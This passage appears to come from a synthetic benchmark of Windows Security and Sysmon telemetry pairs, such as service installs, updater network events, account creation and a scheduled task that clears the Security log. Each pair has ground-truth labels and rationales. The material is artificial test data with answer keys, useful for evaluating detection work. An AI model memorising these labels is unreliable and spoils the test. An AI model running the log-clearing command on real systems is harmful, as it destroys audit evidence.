          "NewProcessName",
          "ParentProcessName"
        ]
      },
      {
        "event_id": "evt_7d72f5f3",
        "fields": [
          "Computer",
          "NewProcessName",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The Explorer selection and cmd.exe directory-listing invocation share the host and helpdesk context expected by the synthetic maintenance case; authorization is not independently recorded.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_537e907a"
}
```

## pair_00ccaea1
Family: TF_UNMAP_D; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_9110c4c9",
    "event_record_id": 24349413172940,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe --instance larch_spruce_elm_00ccae",
      "ServiceName": "Agent_larch_spruce_elm_00ccae",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION01",
      "SubjectLogonId": "0x1d3d",
      "SubjectUserName": "Administrator",
      "TimeCreated": "2026-03-27T17:03:56Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-27T17:03:56Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe --instance larch_spruce_elm_00ccae",
    "ServiceName": "Agent_larch_spruce_elm_00ccae",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION01",
    "SubjectLogonId": "0x1d3d",
    "SubjectUserName": "Administrator",
    "TimeCreated": "2026-03-27T17:03:56Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_D/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_9110c4c9",
        "fields": [
          "ServiceAccount",
          "ServiceFileName",
          "ServiceStartType",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The 4697 event records an image path under ProgramData and an Administrator actor; this alone does not establish signer authenticity or deployment authorization.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_58e94747"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_9110c4c9",
    "event_record_id": 24349413172940,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe --instance larch_spruce_elm_00ccae",
      "ServiceName": "Agent_larch_spruce_elm_00ccae",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION01",
      "SubjectLogonId": "0x1d3d",
      "SubjectUserName": "Administrator",
      "TimeCreated": "2026-03-27T17:03:56Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-27T17:03:56Z",
    "windows_event_id": 4697
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_aca61472",
    "event_record_id": 21452330890772,
    "fields": {
      "CommandLine": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe --instance larch_spruce_elm_00ccae",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=8b4a2219aab6c03ed48dcf2160d407cc5e6917dd6864d0959fba4fb5b14e0adf",
      "Image": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe",
      "LogonGuid": "{50d277cd-ebfc-4809-e41f-c5f0e181578a}",
      "LogonId": "0x1d3d",
      "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
      "ParentImage": "C:\\Windows\\System32\\services.exe",
      "ParentProcessGuid": "{fb7ecb26-2761-ca3c-ed53-3acdb9790dae}",
      "ParentProcessId": 7480,
      "ProcessGuid": "{1382c28f-f614-d727-4192-821a98d8c5a9}",
      "ProcessId": 7488,
      "User": "SYSTEM",
      "UtcTime": "2026-03-27T17:03:59Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-27T17:03:59Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe --instance larch_spruce_elm_00ccae",
    "ServiceName": "Agent_larch_spruce_elm_00ccae",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION01",
    "SubjectLogonId": "0x1d3d",
    "SubjectUserName": "Administrator",
    "TimeCreated": "2026-03-27T17:03:56Z"
  },
  {
    "CommandLine": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe --instance larch_spruce_elm_00ccae",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=8b4a2219aab6c03ed48dcf2160d407cc5e6917dd6864d0959fba4fb5b14e0adf",
    "Image": "C:\\ProgramData\\larch_spruce_elm_00ccae\\agent.exe",
    "LogonGuid": "{50d277cd-ebfc-4809-e41f-c5f0e181578a}",
    "LogonId": "0x1d3d",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentProcessGuid": "{fb7ecb26-2761-ca3c-ed53-3acdb9790dae}",
    "ParentProcessId": 7480,
    "ProcessGuid": "{1382c28f-f614-d727-4192-821a98d8c5a9}",
    "ProcessId": 7488,
    "User": "SYSTEM",
    "UtcTime": "2026-03-27T17:03:59Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_D/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_9110c4c9",
        "fields": [
          "Computer",
          "ServiceAccount",
          "ServiceFileName",
          "ServiceStartType",
          "SubjectUserName"
        ]
      },
      {
        "event_id": "evt_aca61472",
        "fields": [
          "Computer",
          "Image",
          "User"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "Context contains matching service-installation and process-creation records for the same image and arguments; this is consistent with the approved synthetic deployment case but does not prove that the service launched the process.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_17de1bac"
}
```

## pair_075e7895
Family: TF_UNMAP_DEV; split: dev
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_f3f73684",
    "event_record_id": 266135790356409,
    "fields": {
      "Computer": "APPSVR01",
      "DestinationIp": "198.51.100.20",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\ProgramData\\holly_maple_spruce_075e78\\updater.exe",
      "ProcessGuid": "{f20c913f-07b9-4f4c-2035-811cffc82e2d}",
      "ProcessId": 69568,
      "Protocol": "tcp",
      "SourceIp": "198.51.100.10",
      "SourcePort": 56508,
      "User": "wlee",
      "UtcTime": "2026-02-28T10:30:16Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-28T10:30:16Z",
    "windows_event_id": 3
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "APPSVR01",
    "DestinationIp": "198.51.100.20",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\ProgramData\\holly_maple_spruce_075e78\\updater.exe",
    "ProcessGuid": "{f20c913f-07b9-4f4c-2035-811cffc82e2d}",
    "ProcessId": 69568,
    "Protocol": "tcp",
    "SourceIp": "198.51.100.10",
    "SourcePort": 56508,
    "User": "wlee",
    "UtcTime": "2026-02-28T10:30:16Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_DEV/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_f3f73684",
        "fields": [
          "DestinationIp",
          "Image"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The network event is paired with an updater process and a documentation-only endpoint; telemetry does not establish signer authenticity or downloaded file contents.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_0bec9523"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_f3f73684",
    "event_record_id": 266135790356409,
    "fields": {
      "Computer": "APPSVR01",
      "DestinationIp": "198.51.100.20",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\ProgramData\\holly_maple_spruce_075e78\\updater.exe",
      "ProcessGuid": "{f20c913f-07b9-4f4c-2035-811cffc82e2d}",
      "ProcessId": 69568,
      "Protocol": "tcp",
      "SourceIp": "198.51.100.10",
      "SourcePort": 56508,
      "User": "wlee",
      "UtcTime": "2026-02-28T10:30:16Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-28T10:30:16Z",
    "windows_event_id": 3
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_7bae59d4",
    "event_record_id": 228161111612578,
    "fields": {
      "Computer": "APPSVR01",
      "EventID": 11,
      "Image": "C:\\ProgramData\\holly_maple_spruce_075e78\\updater.exe",
      "ProcessGuid": "{f20c913f-07b9-4f4c-2035-811cffc82e2d}",
      "ProcessId": 69568,
      "TargetFilename": "C:\\ProgramData\\holly_maple_spruce_075e78\\Cache\\holly_maple_spruce_075e78.dat",
      "User": "wlee",
      "UtcTime": "2026-02-28T10:30:19Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-28T10:30:19Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "APPSVR01",
    "DestinationIp": "198.51.100.20",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\ProgramData\\holly_maple_spruce_075e78\\updater.exe",
    "ProcessGuid": "{f20c913f-07b9-4f4c-2035-811cffc82e2d}",
    "ProcessId": 69568,
    "Protocol": "tcp",
    "SourceIp": "198.51.100.10",
    "SourcePort": 56508,
    "User": "wlee",
    "UtcTime": "2026-02-28T10:30:16Z"
  },
  {
    "Computer": "APPSVR01",
    "EventID": 11,
    "Image": "C:\\ProgramData\\holly_maple_spruce_075e78\\updater.exe",
    "ProcessGuid": "{f20c913f-07b9-4f4c-2035-811cffc82e2d}",
    "ProcessId": 69568,
    "TargetFilename": "C:\\ProgramData\\holly_maple_spruce_075e78\\Cache\\holly_maple_spruce_075e78.dat",
    "User": "wlee",
    "UtcTime": "2026-02-28T10:30:19Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_DEV/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_f3f73684",
        "fields": [
          "Computer",
          "Image",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_7bae59d4",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The related cache-file event shares the updater process identity; the available evidence does not establish file contents or signer authenticity.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_a4ea38f3"
}
```

## pair_1642358a
Family: TF_UNMAP_DEV; split: dev
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_92242a78",
    "event_record_id": 175228318351635,
    "fields": {
      "Computer": "DB01",
      "DestinationIp": "203.0.113.20",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\ProgramData\\cedar_maple_fir_164235\\updater.exe",
      "ProcessGuid": "{9f5e85ab-8113-fc43-6d61-69d970c9bac8}",
      "ProcessId": 61888,
      "Protocol": "tcp",
      "SourceIp": "198.51.100.30",
      "SourcePort": 59196,
      "User": "agarcia",
      "UtcTime": "2026-01-13T06:22:44Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-13T06:22:44Z",
    "windows_event_id": 3
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "DestinationIp": "203.0.113.20",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\ProgramData\\cedar_maple_fir_164235\\updater.exe",
    "ProcessGuid": "{9f5e85ab-8113-fc43-6d61-69d970c9bac8}",
    "ProcessId": 61888,
    "Protocol": "tcp",
    "SourceIp": "198.51.100.30",
    "SourcePort": 59196,
    "User": "agarcia",
    "UtcTime": "2026-01-13T06:22:44Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_DEV/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_92242a78",
        "fields": [
          "DestinationIp",
          "Image"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The network event is paired with an updater process and a documentation-only endpoint; telemetry does not establish signer authenticity or downloaded file contents.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_5311b0eb"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_92242a78",
    "event_record_id": 175228318351635,
    "fields": {
      "Computer": "DB01",
      "DestinationIp": "203.0.113.20",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\ProgramData\\cedar_maple_fir_164235\\updater.exe",
      "ProcessGuid": "{9f5e85ab-8113-fc43-6d61-69d970c9bac8}",
      "ProcessId": 61888,
      "Protocol": "tcp",
      "SourceIp": "198.51.100.30",
      "SourcePort": 59196,
      "User": "agarcia",
      "UtcTime": "2026-01-13T06:22:44Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-13T06:22:44Z",
    "windows_event_id": 3
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_aecec0b8",
    "event_record_id": 236088549816548,
    "fields": {
      "Computer": "DB01",
      "EventID": 11,
      "Image": "C:\\ProgramData\\cedar_maple_fir_164235\\updater.exe",
      "ProcessGuid": "{9f5e85ab-8113-fc43-6d61-69d970c9bac8}",
      "ProcessId": 61888,
      "TargetFilename": "C:\\ProgramData\\cedar_maple_fir_164235\\Cache\\cedar_maple_fir_164235.dat",
      "User": "agarcia",
      "UtcTime": "2026-01-13T06:22:47Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-13T06:22:47Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "DB01",
    "DestinationIp": "203.0.113.20",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\ProgramData\\cedar_maple_fir_164235\\updater.exe",
    "ProcessGuid": "{9f5e85ab-8113-fc43-6d61-69d970c9bac8}",
    "ProcessId": 61888,
    "Protocol": "tcp",
    "SourceIp": "198.51.100.30",
    "SourcePort": 59196,
    "User": "agarcia",
    "UtcTime": "2026-01-13T06:22:44Z"
  },
  {
    "Computer": "DB01",
    "EventID": 11,
    "Image": "C:\\ProgramData\\cedar_maple_fir_164235\\updater.exe",
    "ProcessGuid": "{9f5e85ab-8113-fc43-6d61-69d970c9bac8}",
    "ProcessId": 61888,
    "TargetFilename": "C:\\ProgramData\\cedar_maple_fir_164235\\Cache\\cedar_maple_fir_164235.dat",
    "User": "agarcia",
    "UtcTime": "2026-01-13T06:22:47Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_DEV/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_92242a78",
        "fields": [
          "Computer",
          "Image",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_aecec0b8",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The related cache-file event shares the updater process identity; the available evidence does not establish file contents or signer authenticity.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_3a7b7e4d"
}
```

## pair_1c70075d
Family: TF_UNMAP_E; split: test
Transition: ambiguous -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_fa684753",
    "event_record_id": 15653602886042,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4720,
      "SubjectLogonId": "0x7fb1",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "jdoe",
      "TimeCreated": "2026-03-18T18:42:53Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-18T18:42:53Z",
    "windows_event_id": 4720
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 4720,
    "SubjectLogonId": "0x7fb1",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "jdoe",
    "TimeCreated": "2026-03-18T18:42:53Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_E/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_fa684753",
        "fields": [
          "SubjectLogonId",
          "SubjectUserName",
          "TargetUserName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 4720 identifies the created account (jdoe) and creator (helpdesk), but actor identity and account creation alone do not establish affirmative authorization in the single view.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_b3a76c2b"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_9e910c62",
    "event_record_id": 253558470052453,
    "fields": {
      "CommandLine": "net user jdoe /add /fullname:\"fir_spruce_ash_1c7007\" /comment:\"Employee onboarding fir_spruce_ash_1c7007\"",
      "Computer": "EXCH01",
      "EventID": 4688,
      "NewProcessId": "0x7fb4",
      "NewProcessName": "C:\\Windows\\System32\\net.exe",
      "ParentProcessName": "C:\\ProgramData\\IAM\\Provisioner.exe",
      "ProcessId": "0x7fac",
      "SubjectLogonId": "0x7fb1",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-03-18T18:42:50Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-18T18:42:50Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_fa684753",
    "event_record_id": 15653602886042,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4720,
      "SubjectLogonId": "0x7fb1",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "jdoe",
      "TimeCreated": "2026-03-18T18:42:53Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-18T18:42:53Z",
    "windows_event_id": 4720
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "net user jdoe /add /fullname:\"fir_spruce_ash_1c7007\" /comment:\"Employee onboarding fir_spruce_ash_1c7007\"",
    "Computer": "EXCH01",
    "EventID": 4688,
    "NewProcessId": "0x7fb4",
    "NewProcessName": "C:\\Windows\\System32\\net.exe",
    "ParentProcessName": "C:\\ProgramData\\IAM\\Provisioner.exe",
    "ProcessId": "0x7fac",
    "SubjectLogonId": "0x7fb1",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-03-18T18:42:50Z"
  },
  {
    "Computer": "EXCH01",
    "EventID": 4720,
    "SubjectLogonId": "0x7fb1",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "jdoe",
    "TimeCreated": "2026-03-18T18:42:53Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_E/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_fa684753",
        "fields": [
          "Computer",
          "SubjectLogonId",
          "SubjectUserName",
          "TargetUserName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_9e910c62",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "ParentProcessName",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The Provisioner.exe parent, net.exe process-creation record, explicit account-add command, temporal order, and host linkage are consistent with the approved synthetic onboarding case; external authorization is not independently recorded.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_c9914392"
}
```

## pair_2d4a2cba
Family: TF_UNMAP_EVTCLR; split: test
Transition: ambiguous -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_c2cc6102",
    "event_record_id": 125956470016981,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0x12939",
      "SubjectUserName": "SYSTEM",
      "TimeCreated": "2026-04-23T01:49:38Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-04-23T01:49:38Z",
    "windows_event_id": 1102
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0x12939",
    "SubjectUserName": "SYSTEM",
    "TimeCreated": "2026-04-23T01:49:38Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_EVTCLR/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_c2cc6102",
        "fields": [
          "EventID",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 1102 and subject metadata show a log clear, but the single view does not establish authorization or mechanism.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_21baf8d8"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_13f4e06d",
    "event_record_id": 14092354160044,
    "fields": {
      "Computer": "DB01",
      "EventID": 4698,
      "SubjectLogonId": "0x12939",
      "SubjectUserName": "SYSTEM",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\oak_yew_alder_2d4a2c\\logrotate.exe</Command><Arguments>--clear Security --archive C:\\ProgramData\\oak_yew_alder_2d4a2c\\retention.evtx</Arguments></Exec></Actions></Task>",
      "TaskName": "\\LogRetention_oak_yew_alder_2d4a2c",
      "TimeCreated": "2026-04-23T01:49:32Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-23T01:49:32Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_3d3a8f91",
    "event_record_id": 256057981831155,
    "fields": {
      "CommandLine": "C:\\ProgramData\\oak_yew_alder_2d4a2c\\logrotate.exe --clear Security --archive C:\\ProgramData\\oak_yew_alder_2d4a2c\\retention.evtx",
      "Computer": "DB01",
      "EventID": 1,
      "Hashes": "SHA256=e8c112a6885eb75e604c6403e6ac1eed623cb2c87448a3f731df05ffd642a409",
      "Image": "C:\\ProgramData\\oak_yew_alder_2d4a2c\\logrotate.exe",
      "LogonGuid": "{9ede764d-7d53-5673-b5d5-501e8f94e508}",
      "LogonId": "0x12939",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{fbbe4b6b-a715-717f-71e1-cb6e413b33b0}",
      "ParentProcessId": 76084,
      "ProcessGuid": "{e8e2250c-87f3-05e9-a898-233c300a94f0}",
      "ProcessId": 76096,
      "User": "SYSTEM",
      "UtcTime": "2026-04-23T01:49:35Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-04-23T01:49:35Z",
    "windows_event_id": 1
  },
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_c2cc6102",
    "event_record_id": 125956470016981,
    "fields": {
      "Computer": "DB01",
      "EventID": 1102,
      "SubjectLogonId": "0x12939",
      "SubjectUserName": "SYSTEM",
      "TimeCreated": "2026-04-23T01:49:38Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-04-23T01:49:38Z",
    "windows_event_id": 1102
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 4698,
    "SubjectLogonId": "0x12939",
    "SubjectUserName": "SYSTEM",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\oak_yew_alder_2d4a2c\\logrotate.exe</Command><Arguments>--clear Security --archive C:\\ProgramData\\oak_yew_alder_2d4a2c\\retention.evtx</Arguments></Exec></Actions></Task>",
    "TaskName": "\\LogRetention_oak_yew_alder_2d4a2c",
    "TimeCreated": "2026-04-23T01:49:32Z"
  },
  {
    "CommandLine": "C:\\ProgramData\\oak_yew_alder_2d4a2c\\logrotate.exe --clear Security --archive C:\\ProgramData\\oak_yew_alder_2d4a2c\\retention.evtx",
    "Computer": "DB01",
    "EventID": 1,
    "Hashes": "SHA256=e8c112a6885eb75e604c6403e6ac1eed623cb2c87448a3f731df05ffd642a409",
    "Image": "C:\\ProgramData\\oak_yew_alder_2d4a2c\\logrotate.exe",
    "LogonGuid": "{9ede764d-7d53-5673-b5d5-501e8f94e508}",
    "LogonId": "0x12939",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{fbbe4b6b-a715-717f-71e1-cb6e413b33b0}",
    "ParentProcessId": 76084,
    "ProcessGuid": "{e8e2250c-87f3-05e9-a898-233c300a94f0}",
    "ProcessId": 76096,
    "User": "SYSTEM",
    "UtcTime": "2026-04-23T01:49:35Z"
  },
  {
    "Computer": "DB01",
    "EventID": 1102,
    "SubjectLogonId": "0x12939",
    "SubjectUserName": "SYSTEM",
    "TimeCreated": "2026-04-23T01:49:38Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_EVTCLR/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_c2cc6102",
        "fields": [
          "Computer",
          "EventID",
          "SubjectLogonId",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_13f4e06d",
        "fields": [
          "Computer",
          "SubjectLogonId",
          "TaskContent",
          "TaskName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_3d3a8f91",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "LogonId",
          "ParentImage",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The synthetic SecurityLogRetention task configuration, logrotate.exe process-creation record, taskeng parent, ordering, host, and logon are consistent with the approved maintenance case; authorization is not independently established.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_be77c37d"
}
```

## pair_191d13ad
Family: TF_UNMAP_PS; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_1e6d758c",
    "event_record_id": 233345166728688,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command \"Get-Service -Name maple_holly_birch_191d13\"",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{e2b9c3d8-191e-062e-9da2-b7f49687ae60}",
      "LogonId": "0xd00d",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{38ccbde4-67f4-f4e4-0e10-a5509b94f9bb}",
      "ParentProcessId": 53264,
      "ProcessGuid": "{d439e7c5-ddf0-69ce-afda-f2fe7f4c692a}",
      "ProcessId": 53260,
      "User": "jsmith",
      "UtcTime": "2026-06-14T00:00:45Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-14T00:00:45Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
